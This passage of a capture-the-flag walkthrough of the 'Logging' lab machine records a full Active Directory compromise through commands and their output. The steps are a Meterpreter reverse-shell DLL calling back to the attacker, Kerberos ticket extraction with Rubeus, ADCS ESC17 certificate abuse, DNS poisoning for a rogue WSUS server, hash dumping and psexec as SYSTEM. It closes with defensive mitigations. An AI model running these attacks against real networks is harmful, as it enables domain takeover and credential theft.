msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.14.10" LPORT=6666 -f dll -o settings_update.dll
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of dll file: 9216 bytes
Saved as: settings_update.dll
```

- 🔍 *We launch a Metasploit listener on our attack machine:*

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 6666; run"
```

```text
[*] Started reverse TCP handler on 10.10.14.10:6666
```

- 🔍 *We compress the DLL into `Settings_Update.zip`:*

```bash
zip Settings_Update.zip settings_update.dll
```

```text
updating: settings_update.dll (deflated 82%)
```

- 🔍 *Using our WinRM session, we upload `Settings_Update.zip` to `C:\ProgramData\UpdateMonitor\`:*

```powershell
upload Settings_Update.zip
```

```text
Info: Uploading Settings_Update.zip to C:\ProgramData\UpdateMonitor\Settings_Update.zip
Info: Upload successful!
```

- 🔍 *Once the task runs, it unzips our payload and triggers the reverse shell, granting us access as `jaylee.clifton`:*

```text
[*] Sending stage (188998 bytes) to 10.129.44.87
[*] Meterpreter session 1 opened (10.10.14.10:6666 -> 10.129.44.87:61364) at 2026-04-23 14:27:36 +0000

meterpreter > getuid
Server username: logging\jaylee.clifton
```

- 🔍 *We confirm the update extraction via the log files:*

```text
[2026-04-23 14:53:15] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[2026-04-23 14:53:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
```

---

## Step 3 - Privilege Escalation

- 🔍 *Since the Meterpreter shell has limitations, we need to extract a delegation TGT for `jaylee.clifton` using `Rubeus.exe`:*
- 🔍 *We upload `Rubeus.exe` to `C:\temp\`:*

```powershell
upload /home/kali/Tools/Rubeus/Rubeus.exe C:\temp\Rubeus.exe
```

```text
[*] Completed  : /home/kali/Tools/Rubeus/Rubeus.exe -> C:\temp\Rubeus.exe
```

- 🔍 *We drop into a command shell and request the delegation TGT:*

```cmd
C:\temp\Rubeus.exe tgtdeleg /nowrap
```

```text
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|\____/|____/|_____)____/(___/
   v2.3.3

[*] Action: Request Fake Delegation TGT (current user)
[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.logging.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: oc2Y1Y3mE9r22OwIvilr5lhxTMTOnr9QRkQpAWTM/QU=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):
      doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuinaHjSnK4H3+76qTnTuJtdNPVj9GkpJW0kBE8SsQu7ulvVA/HuqBdu5LnwTcopvyeqlhU1xwT3X6a/5D+c/H8Zu0MC+NboZSJq4E+vkoZiaxNa9e2eyk8BQ1kl5Jv/OKKnLp5GFRCMvbYX82HEyan94aR5+pzC38RmGJv4fhkso+iRbWTluA0kRJpPXVE3BAMR50hbJXH+VwJZy7kR32+1EYK/vJeqwpDmGh/mgma8XwUf5wdd7NqPs3rixtVZoHEeb7C0wnIf780xdGDdH2weEM5AVZzUwDS2P5RJhSnYnSKUIcDZeBNWGUE16Y1PIoFr7cM9RBn9raG7qKosXe0mXRWsAt7jus8eR0RLA4zJKB35J8e0hTLtYjw3dXFOk3zJ98yzYR72agfuD5b2SqdHITg55EWVyMLQFVJGz44zuL0o30FBwCYFJQtvh6eb99SL8tq6dhsQA4Ha9VtHEAk/btvHh7Su0ESSnwU4CfNp7/0qbB5ueCm5KzSgFtzFSEzKL4OHEnnmroRjFpWoZNElZ/H8eyLE/8kLKhXoVL4mcWy/dR/fRErMWmjH+71txB6eXaylR0bCtFF81afH5joHjAPDLxbfyLFOWa5XYiCeJcYr+/NX1ojqeSWdHN2Ql31NZUTiMVHZeg2HnZZU9L4b+QpKVwWk3BI3jYhLCBCYQrIFvYJHiAsevhtJxUm3Jmt9sbZNqjoBx/0R8Kvyr7dMWpUoWf4aDRm3IsNR4l3gGqRgURip2A0svqh6x5laGTtK6RqXAg3DtUFSXEq4fFsaMACcxENlsIUcbTtDYxKiOiCaMfRqYmX90sYvLlzwknBojqFJQkUMsCgO06YgxKVuYoaxwHZm6+jzmQdO5O5RUXesonq7lYjOx4hvJxXySzihieZp4m8VTYHn+8qplbnw+Fkh8V+omVy6ocHV/5ZLVjCB4PeMjakBKs2hhvj0S4gR/j9gVNokooIwCn1RIfkyBpo/69iqy+D3himqRALjuyzSpxJTJbtWjFRThPwlN5wTb+rMLlyMNC8mReesXs0m+oSoRKuwd2UIaMSb2Vivfvq59XbfD3B26wRGE04F32gyzkQpgbJn7hPCygGWJ6imECPTewOziXqGrtzg+V2rs9cIHlrLMuLnOndIPInhfSKVplef4fVvs+swfR1Vm/0GrTXsOLnFhKDK0i+bZ5Pp/ekIrrO0/cmThMJqvk2PTAzeOk/5TUVF+3e55n47s6mFzcGXH4x9SRJ+c/OXe2xU2Zq9OYOzwgvN0AtWrt+5PeVk0sOHFD8ZrOvuftWMvADbj1VowpZ+KqBGX5a4FZAUKtdSb0SAPPFWrXU7P8KOVwkw/xkOp8F1TwqhVn+bbHr1bgFaXuscGncIHBWshASanobqty0iNx/SN7BxmAlCO7hqx5GSHxA7IH4188F7ieKVvcrXInn6jpcQzPhtchXmY0YnvY0Mu7dXUw8BCatjdW23ZHAQ8G6YaGPR+0O9kqcMfPo82tIkffRNoJrYDRo4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgYTO9mSJfirf3Z6DaIicdVmCJmWPCFzrSFxtMkJHsmXKhDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDQyNDIxMzcwOFqmERgPMjAyNjA0MjUwNzMyMTVapxEYDzIwMjYwNTAxMjEzMjE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=
```

- 🔍 *We save the Base64 block into a `.kirbi` file on our attack machine and convert it to `.ccache`:*

```bash
echo -n 'doIFy...' | tr -d ' \r\n\t' | base64 -d > jaylee.kirbi
ticketConverter.py jaylee.kirbi jaylee.ccache
```

```text
[*] converting kirbi to ccache...
[+] done
```

- 🔍 *We export and verify the ticket on our attack system:*

```bash
export KRB5CCNAME=jaylee.ccache
klist
```

```text
Ticket cache: FILE:jaylee.ccache
Default principal: jaylee.clifton@LOGGING.HTB

Valid starting       Expires              Service principal
04/24/2026 21:37:08  04/25/2026 07:32:15  krbtgt/LOGGING.HTB@LOGGING.HTB
        renew until 05/01/2026 21:32:15
```

- 🔍 *Now we enumerate Active Directory Certificate Services (ADCS) templates:*

```cmd
C:\temp\certutil.exe -v -template UpdateSrv
```

```text
  Template[29]:
  TemplatePropCommonName = UpdateSrv
  TemplatePropFriendlyName = UpdateSrv
  TemplatePropEKUs =
  1 ObjectIds:
    1.3.6.1.5.5.7.3.1 Server Authentication
  TemplatePropEnrollmentFlags = 0
  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
  TemplatePropGeneralFlags = 20241 (131649)
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
    CT_FLAG_MACHINE_TYPE -- 40 (64)
  TemplatePropSecurityDescriptor = ...
    Allow Enroll        logging\IT
    Allow Enroll        logging\Domain Admins
    Allow Enroll        logging\Enterprise Admins
```

> [!WARNING]
> **ADCS Template Vulnerability Profile (ESC17):**
> The `UpdateSrv` template has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (SAN) flag enabled. The EKU is configured only for `Server Authentication` (`1.3.6.1.5.5.7.3.1`).
> 
> Because the template lacks user authentication EKUs, we cannot request a certificate to directly masquerade as administrative users (ruling out standard ESC1). However, we can perform an **ESC17** attack. Since the template is machine-type, we can request a valid Server Authentication certificate for domain update assets (such as `wsus.logging.htb`) and perform rogue update spoofing.

- 🔍 *First, we locate the WSUS configurations by querying the registry:*

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
```

```text
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    https://wsus.logging.htb:8531
```

- 🔍 *We request a certificate using `Certify.exe` with `wsus.logging.htb` as the alternative name:*

```cmd
C:\Users\Public\Certify.exe request /ca:dc01.logging.htb\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb
```

```text
[*] Action: Request a Certificates
[*] Current user context    : logging\jaylee.clifton
[*] Template                : UpdateSrv
[*] Subject                 : CN=jaylee.clifton, CN=Users, DC=logging, DC=htb
[*] AltName                 : wsus.logging.htb
[*] Certificate Authority   : dc01.logging.htb\logging-DC01-CA
[*] CA Response             : The certificate had been issued.
[*] Request ID              : 14

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA5cTZFo3SuGumlh3CxgvFPKg3NLk2mEc1AI/teTllCEXRCLs6
...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGtDCCBJygAwIBAgITFAAAAA4rbY7rj52g9wACAAAADjANBgkqhkiG9w0BAQsF
...
-----END CERTIFICATE-----
```

- 🔍 *We save the output to `wsus.pem` and compile it into a PKCS12 `.pfx` file:*

```bash
openssl pkcs12 -in wsus.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out wsus.pfx
```

- 🔍 *To perform the WSUS MITM attack, client computers must connect to our machine instead of the real WSUS server. We add a DNS record for `wsus` using `bloodyAD` and our Kerberos ticket:*

```bash
bloodyAD --host 10.129.245.130 -d logging.htb -k add dnsRecord wsus 10.10.15.169
```

```text
[+] wsus has been successfully updated
```

- 🔍 *We verify the DNS redirection via `nslookup`:*

```bash
nslookup wsus.logging.htb 10.129.245.130
```

```text
Server:         10.129.245.130
Address:        10.129.245.130#53

Name:   wsus.logging.htb
Address: 10.10.15.169
```

- 🔍 *We extract the certificate and key components from our `.pfx` to build the rogue update server:*

```bash
openssl pkcs12 -in wsus.pfx -clcerts -nokeys -out wsus.crt -nodes
openssl pkcs12 -in wsus.pfx -nocerts -out wsus.key -nodes
cat wsus.crt wsus.key > wsus_combined.pem
```

- 🔍 *We spin up the rogue WSUS server using `wsuks` to serve a malicious update. When client computers query for updates, our rogue server will deploy `PsExec64` and add our `msa_health$` gMSA account to the Domain Admins group:*

```bash
sudo wsuks --serve-only \
    --WSUS-Server wsus.logging.htb \
    --tls-cert wsus_combined.pem \
    -I tun0 \
    -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\" "'
```

```text
    __          __ _____  _    _  _  __  _____
    \ \        / // ____|| |  | || |/ / / ____|
     \ \  /\  / /| (___  | |  | || ' / | (___  
      \ \/  \/ /  \___ \ | |  | ||  <   \___ \ 
       \  /\  /   ____) || |__| || . \  ____) |
        \/  \/   |_____/  \____/ |_|\_\|_____/ 
                                               
     Pentesting Tool for the WSUS MITM Attack
               Made by NeffIsBack
                 version: 1.2.1

[+] Command to execute:
PsExec64.exe /accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""

[*] ===== Starting Web Server =====
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 10.10.15.169:8531...
[*] Serving executable as KB: 5876493
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"
[+] Received GET request: /a5ace7c0-c255-4db3-891d-c57a6b8c323e/PsExec64.exe
```

- 🔍 *The rogue update completes. We authenticate as `msa_health$` via `evil-winrm` to verify our privileges:*

```bash
evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
```

```text
*Evil-WinRM* PS C:\Users\msa_health$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

- 🔍 *We are now a member of Domain Admins. We retrieve the root flag from `toby.brynleigh`'s desktop:*

```powershell
Get-ChildItem -Path "C:\Users\toby.brynleigh\Desktop"
Get-Content -Path "C:\Users\toby.brynleigh\Desktop\root.txt"
```

```text
    Directory: C:\users\toby.brynleigh\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/19/2026   1:16 PM             34 root.txt

34b8c9a*************************
```

- 🔍 *Domain Compromised.*

---

## Step 4 - Post Exploitation

- 🔍 *With `msa_health$` inside the `Domain Admins` group, we dump the domain NT hashes using `secretsdump.py`:*

```bash
secretsdump.py -hashes :603fc24ee01a9409f83c9d1d701485c5 'logging.htb/msa_health$@dc01.logging.htb'
```

```text
[*] Querying offset from: logging.htb
[*] Running: secretsdump.py -hashes :603fc24ee01a9409f83c9d1d701485c5 logging.htb/msa_health$@dc01.logging.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x36936928a3ec7aa076d5b89ac8d4a1c1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
```

- 🔍 *We request a TGT ticket for the `Administrator` account using its NT hash:*

```bash
getTGT.py logging.htb/Administrator -hashes ':a0c1d1bed9126632f5f1f2b3f790bdb5'
```

```text
[*] Saving ticket in Administrator.ccache
```

- 🔍 *We export the ticket:*

```bash
export KRB5CCNAME=Administrator.ccache
```

- 🔍 *Finally, we log in as `SYSTEM` on the Domain Controller using `psexec.py`:*

```bash
psexec.py -k -no-pass 'LOGGING.HTB/Administrator@dc01.logging.htb'
```

```text
[*] Requesting shares on dc01.logging.htb.....
[*] Found writable share ADMIN$
[*] Uploading file BUwGuTPW.exe
[*] Opening SVCManager on dc01.logging.htb.....
[*] Creating service paOB on dc01.logging.htb.....
[*] Starting service paOB.....
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

- 🔍 *Full Domain Compromised.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Enterprise Active Directory Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Logging lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Plaintext Credentials Exposed in Public SMB Shares

> [!WARNING]
> **Vulnerability Profile:**
> The `Logs` SMB share was readable by all standard domain users and contained trace files exposing administrative service credentials (`svc_recovery`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Exposing service credentials in plaintext allows low-privileged attackers to gain lateral movement within the directory, access critical services, and target AD delegation structures.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove read access on sensitive logs directories for non-administrative accounts.
> - **Remediation:** Implement automated log-scrubbing tools to strip plaintext credential strings from diagnostic traces.
> - **Detection:** Set up detection rules monitoring access to shared files containing standard password-revealing substrings (`BindPass`, `password=`).

---

### 🔴 Insecure AD Object Write Delegation (GenericWrite)

> [!WARNING]
> **Vulnerability Profile:**
> The `svc_recovery` account has write permissions (`GenericWrite`) over the `msa_health$` computer object.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> GenericWrite access permits attackers to write certificates to the `msDS-KeyCredentialLink` attribute (Shadow Credentials), obtaining TGT sessions as the target object via PKINIT and escalating privileges.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove direct `GenericWrite` and `WriteDacl` permissions over computer/service objects from standard or service accounts.
> - **Detection:** Perform regular BloodHound directory audits to identify administrative control loops. Monitor Event ID 5136 for edits matching `msDS-KeyCredentialLink`.

---

### 🔴 Insecure Scheduled Task Executing Unverified DLLs

> [!WARNING]
> **Vulnerability Profile:**
> The `UpdateMonitor` scheduled task extracts a zip archive located in a world-writable path (`C:\ProgramData`) and loads a DLL (`settings_update.dll`) without checking its code signature.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Standard users can drop arbitrary payloads into the zip path, leading to immediate DLL hijacking and arbitrary command execution in the context of the task executor (`jaylee.clifton`).

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Enforce code signing verification (Authenticode) on the update binary before loading external library DLLs.
> - **Remediation:** Set rigid folder permissions restricting writes to `C:\ProgramData\UpdateMonitor` only to administrative accounts.
> - **Detection:** Track and alert on suspicious DLL load anomalies inside application sub-bin paths using EDR tools.

---

### 🔴 ADCS Template ESC17 (Rogue WSUS Server Spoofing)

> [!WARNING]
> **Vulnerability Profile:**
> The `UpdateSrv` certificate template allows the enrollee to supply the Subject Alternative Name (SAN) and is marked for machine authentication with Server Authentication EKU.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can mint valid transport certificates for the domain's update server (`wsus.logging.htb`), poison DNS tables, and deploy a rogue WSUS server. This allows them to push malicious updates that execute commands as `SYSTEM` on computers contacting the update endpoint.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Disable the `ENROLLEE_SUPPLIES_SUBJECT` flag on certificate templates containing Server Authentication EKU.
> - **Remediation:** Secure WSUS settings to force SSL communication and validate update packages against explicit trusted certificates.
> - **Detection:** Monitor DNS zone transfers and active A-record modifications targeting WSUS hostnames.
